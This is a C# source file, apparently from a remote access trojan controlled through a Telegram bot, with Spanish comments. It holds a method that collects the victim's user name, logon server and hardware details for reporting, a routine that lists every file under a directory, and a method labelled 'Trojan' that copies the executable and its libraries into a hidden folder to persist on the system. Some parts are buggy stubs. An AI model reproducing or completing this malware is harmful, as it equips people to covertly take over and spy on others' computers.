﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Threading.Tasks;
using RAT_BotTelegram.Lib;
using System.IO;
using Microsoft.SqlServer.Server;
using System.Runtime.InteropServices;

namespace RAT_BotTelegram.Lib {
    internal sealed class Tools {

        public static String PC_Info() {
            Console.WriteLine(Features.getArchitecture());
            String Info = "Detailed Computer Information" +

                "\n\n*UserData *" +
                "\n - User Name: " + Features.getUserName() +
                "\n - User Profile: C:\\User\\" + Features.getUserName() +
                "\n - User Domain: " + Features.getUserName() +
                "\n - Logon Server: " + Features.getLogonServer() +
                "\n - AppData: C:\\Users\\" + Features.getUserName() + @"\AppData\Roaming " +
                "\n - Home Path: \\Users\\" + Features.getUserName() +


                "\n\n*Processor *" +
                "\n - Name: " + Features.getProcessorName() +
                "\n - Frequency: " + Features.getProcessorGhz() + " Ghz" +
                "\n - Architecture: " + Features.getArchitecture() +


                "\n\n*Motherboard *" +
                "\n - Name: " + Features.getMotherboardName() +
                "\n - Manufacturer: " + Features.getMotherboardManufacturer() +
                "\n - BIOSVendor: " + Features.getBIOSVendor() +

                "";
            return Info;
        }

        public static string[] GetFile(string dir) {
            // Obtiene Nombre del procesador
            try {

                string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
                return allfiles;
            } catch (Exception e) {
                string[] allfiles = { "[-]" };
                Console.WriteLine("La carpeta no existe: " + e);
                return allfiles;
            }
        }
        public static string[] GetFolder() {
            // Obtiene Nombre del procesador
            string[] allfiles = null;
            int n = 0;
            try {
                foreach (string folder in Directory.GetDirectories(@"C:\")) {
                    n = n + 1;
                    allfiles[n] = folder;

                    //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
                    //GetDirectoryAll(folder, indent + 2);
                }
            } catch (UnauthorizedAccessException) {
            }



            return allfiles;
            //try {
            //    string[] allFolder = Directory.GetDirectories(dir);
            //    //string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
            //    return allFolder;
            //} catch (Exception e) {
            //    string[] allfiles = { "[-]" };
            //    Console.WriteLine("La carpeta no existe: " + e);
            //    return allfiles;
            //}
        }

        public static void StartUp() {  // Autoiniciar al iniciar sesión
            Console.WriteLine("Startup");
        }
        public static void Trojan() {   // Se replica en el sistema
            Console.WriteLine("==>[Troyano] En proceso...");
            // New Name *.pdb
            string exeName = config.NAME_EXE;
            exeName = exeName.Substring(0, exeName.Length - 4);

            // Crea Directorio
            Directory.CreateDirectory(config.PATH_OCUL);
            Console.WriteLine("==>[Directory] Se creó la ruta:\n"+config.PATH_OCUL);
           
            // Copia archivo principal
            try {
                File.Copy(config.NAME_EXE, config.PATH_OCUL + @"\" + config.NAME_EXE);
                Console.WriteLine("==>[File] Se copió: \n" + config.NAME_EXE);
            } catch {Console.WriteLine("==>[File] El archivo: \n" + config.NAME_EXE+ " ya existe.");}
            // Copia archivos secundarios.
            try {
                File.Copy(config.NAME_EXE + ".config", config.PATH_OCUL + @"\" + config.NAME_EXE + ".config");
                Console.WriteLine("==>[File] Se copió: \n" + config.NAME_EXE + ".config");
            } catch {Console.WriteLine("==>[File] El archivo: \n" + config.NAME_EXE + ".config"+ " ya existe.");}
            try {
                Console.WriteLine(exeName);
                File.Copy(exeName + ".pdb", config.PATH_OCUL + @"\" + exeName + ".pdb");
                Console.WriteLine("==>[File] Se copió: \n" + exeName + ".pdb");
            } catch {Console.WriteLine("==>[File] El archivo: \n" + exeName + ".pdb" + " ya existe.");}
            try {
                File.Copy("Telegram.Bot.dll", config.PATH_OCUL + @"\" + "Telegram.Bot.dll");
                Console.WriteLine("==>[File] Se copió: \nTelegram.Bot.dll");
            } catch {Console.WriteLine("==>[File] El archivo: \nTelegram.Bot.dll" + " ya existe.");}
            try {
                File.Copy("Telegram.Bot.xml", config.PATH_OCUL + @"\" + "Telegram.Bot.xml");
                Console.WriteLine("==>[File] Se copió: \nTelegram.Bot.xml");
            } catch {Console.WriteLine("==>[File] El archivo: \nTelegram.Bot.xml ya existe.");}
            try {
                File.Copy("Newtonsoft.Json.dll", config.PATH_OCUL + @"\" + "Newtonsoft.Json.dll");
                Console.WriteLine("==>[File] Se copió: \nNewtonsoft.Json.dll");
            } catch {Console.WriteLine("==>[File] El archivo: \nNewtonsoft.Json.dll ya existe.");}
            try {
                File.Copy("Newtonsoft.Json.xml", config.PATH_OCUL + @"\" + "Newtonsoft.Json.xml");
                Console.WriteLine("==>[File] Se copió: \nNewtonsoft.Json.xml");
            } catch  {Console.WriteLine("==>[File] El archivo: \nNewtonsoft.Json.xml ya existe.");}

            Console.WriteLine("==>[Troyano] Finish");

        }
    
    
    }
}